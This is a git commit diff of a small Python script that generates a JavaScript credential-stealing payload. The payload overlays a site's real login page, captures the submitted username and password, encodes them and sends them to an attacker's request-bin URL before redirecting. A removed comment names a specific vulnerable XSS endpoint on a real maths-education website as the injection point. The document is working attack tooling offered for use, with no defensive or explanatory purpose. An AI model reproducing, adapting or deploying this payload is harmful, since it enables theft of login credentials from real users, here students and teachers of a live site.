ae62ca53a7d8474ec5e4289f19e1a048e3e7c4ae
Oelin <42823429+Oelin@users.noreply.github.com>
2020-07-09 09:56:55 +0200

    Update index.py

--- index.py
+++ index.py
@@ -1,11 +1,9 @@
-template = '''(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+btoa(c[0].value+"||"+c[1].value),a(()=>window.location="/do-question.php?aaid=%d",1e3)}),4e3)</script>`))()'''
+template = '''(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+btoa(c[0].value+"||"+c[1].value),a(()=>window.location="%d",1e3)}),4e3)</script>`))()'''
 
 bin = input('request bin url: ')
-aaid = int(input('question id: '))
-code = template % (bin, aaid)
+comfort = int(input('comfort url: '))
+code = template % (bin, comfort)
+origin = input('origin: ')
 
-origin = input('origin for JavaScript: ')
 print(f'upload the following code to {origin}\n')
 print(f'{code}\n')
-
-# vulnerable endpoint: https://drfrostmaths.com/worksheets.php?wdid=-3;</script><script src=[origin]><!--
